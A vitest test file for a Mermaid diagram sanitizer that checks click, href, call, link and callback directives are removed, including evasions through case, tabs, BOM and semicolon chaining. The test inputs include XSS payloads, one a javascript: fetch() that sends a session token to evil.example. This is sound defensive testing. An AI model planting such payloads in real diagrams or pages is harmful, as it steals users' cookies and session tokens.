import { describe, it, expect } from 'vitest'
import { sanitizeMermaidSource } from './mermaidSanitizer'

const flow = (...body: string[]) => ['graph TD', ...body].join('\n')

describe('sanitizeMermaidSource', () => {
  it('leaves diagrams without interaction directives untouched', () => {
    const source = flow(
      '  subgraph services[Services Layer]',
      '    api[API] --> db[(Database)]',
      '  end',
      '  clickable[Clickable node] --> api',
      '  A["Please click here"] -->|click| B',
      '  classDef hot fill:#f00;',
      '  %% click A "javascript:alert(1)" in a comment is inert',
    )
    expect(sanitizeMermaidSource(source)).toEqual({ code: source, removed: [] })
  })

  it('removes a click directive with a javascript: URL', () => {
    const { code, removed } = sanitizeMermaidSource(
      flow('  A[Node] --> B', '  click A "javascript:alert(document.cookie)"'),
    )
    expect(code).not.toMatch(/javascript:/)
    expect(code).toContain('A[Node] --> B')
    expect(removed).toEqual(['click A "javascript:alert(document.cookie)"'])
  })

  it('removes click href directives, including javascript: targets', () => {
    const { code, removed } = sanitizeMermaidSource(
      flow(
        '  A --> B',
        '  click A href "javascript:fetch(\'//evil.example/\'+sessionStorage.getItem(\'t\'))" _self',
        '  click B href "https://example.com" _blank',
      ),
    )
    expect(code).not.toMatch(/click|href|javascript/i)
    expect(removed).toHaveLength(2)
  })

  it('removes callbacks to arbitrary window functions, with or without `call`', () => {
    const { code, removed } = sanitizeMermaidSource(
      flow(
        '  A --> B',
        '  click A alert "tooltip"',
        '  click B call eval("alert(1)")',
        '  click A __mermaidToggle',
      ),
    )
    expect(code).toBe(flow('  A --> B', '', '', ''))
    expect(removed).toEqual([
      'click A alert "tooltip"',
      'click B call eval("alert(1)")',
      'click A __mermaidToggle',
    ])
  })

  it.each([
    ['uppercase', 'CLICK A "javascript:alert(1)"'],
    ['mixed case', 'ClIcK A call alert(1)'],
    ['leading tabs', '\t\tclick A "javascript:alert(1)"'],
    ['tab separator', 'click\tA\t"javascript:alert(1)"'],
    ['non-breaking space indent', ' click A "javascript:alert(1)"'],
    ['BOM prefix', '﻿click A "javascript:alert(1)"'],
    ['CRLF line ending', 'click A "javascript:alert(1)"\r'],
    ['bare keyword', 'click'],
  ])('removes click directives written with %s', (_label, directive) => {
    const { code, removed } = sanitizeMermaidSource(flow('  A --> B', directive))
    expect(code).toBe(flow('  A --> B', ''))
    expect(removed).toHaveLength(1)
  })

  it('removes click statements chained after `;` on the same line', () => {
    const { code, removed } = sanitizeMermaidSource(
      flow('  A --> B; click A "javascript:alert(1)";B --> C;  CLICK B call alert(2)'),
    )
    expect(code).toBe(flow('  A --> B;;B --> C;'))
    expect(removed).toEqual(['click A "javascript:alert(1)"', 'CLICK B call alert(2)'])
  })

  it('removes click statements hidden behind an inline %%{init}%% directive', () => {
    const { code, removed } = sanitizeMermaidSource(
      flow('%%{init: {"theme": "dark"}}%%click A call alert(1)', '  A --> B'),
    )
    expect(code).toBe(flow('%%{init: {"theme": "dark"}}%%', '  A --> B'))
    expect(removed).toEqual(['click A call alert(1)'])
  })

  it('errs on the side of removal when a `;` splits a quoted string', () => {
    // Mermaid and this sanitizer may disagree on string boundaries; removing too much only
    // breaks parsing, it never leaves a live directive behind.
    const { code } = sanitizeMermaidSource(flow('  A["x"]; click A "javascript:alert(1)" %% "'))
    expect(code).not.toMatch(/click/i)
  })

  it('does not treat node IDs that merely start with "click" as directives', () => {
    const source = flow('  clicker --> clickable', '  clickHandler[Handler]')
    expect(sanitizeMermaidSource(source).removed).toEqual([])
  })

  it('removes gantt click directives', () => {
    const source = [
      'gantt',
      '  dateFormat YYYY-MM-DD',
      '  Deploy :a1, 2026-01-01, 3d',
      '  click a1 href "javascript:alert(1)"',
      '  click a1 call alert(1)',
    ].join('\n')
    const { code, removed } = sanitizeMermaidSource(source)
    expect(code).not.toMatch(/click/)
    expect(removed).toHaveLength(2)
  })

  it('removes class diagram link and callback directives', () => {
    const source = [
      'classDiagram',
      '  class Shape',
      '  link Shape "javascript:alert(1)" "tooltip"',
      '  callback Shape "alert" "tooltip"',
      '  click Shape call alert(1)',
      '  LINK Shape "javascript:alert(2)"',
    ].join('\n')
    const { code, removed } = sanitizeMermaidSource(source)
    expect(code).toBe(['classDiagram', '  class Shape', '', '', '', ''].join('\n'))
    expect(removed).toHaveLength(4)
  })

  it('keeps class diagram relationships for a class named link', () => {
    const source = ['classDiagram', '  link <|-- Base', '  link o-- Part', '  link --> Other'].join('\n')
    expect(sanitizeMermaidSource(source).removed).toEqual([])
  })

  it('removes sequence diagram actor link menus', () => {
    const source = [
      '---',
      'title: Menus',
      '---',
      'sequenceDiagram',
      '  participant Alice',
      '  link Alice: Dashboard @ javascript:alert(1)',
      '  links Alice: {"Wiki": "javascript:alert(2)"}',
      '  Alice->>Bob: Hello',
    ].join('\n')
    const { code, removed } = sanitizeMermaidSource(source)
    expect(code).not.toMatch(/javascript/)
    expect(code).toContain('Alice->>Bob: Hello')
    expect(removed).toHaveLength(2)
  })

  it('keeps free-text lines starting with "Link" in diagrams where it is not a keyword', () => {
    const flowchartSource = flow('  link & other --> target')
    const ganttSource = ['gantt', '  section Setup', '  Link accounts :a1, 2026-01-01, 1d'].join('\n')
    const mindmapSource = ['mindmap', '  root', '    Links to docs'].join('\n')
    expect(sanitizeMermaidSource(flowchartSource).removed).toEqual([])
    expect(sanitizeMermaidSource(ganttSource).removed).toEqual([])
    expect(sanitizeMermaidSource(mindmapSource).removed).toEqual([])
  })
})
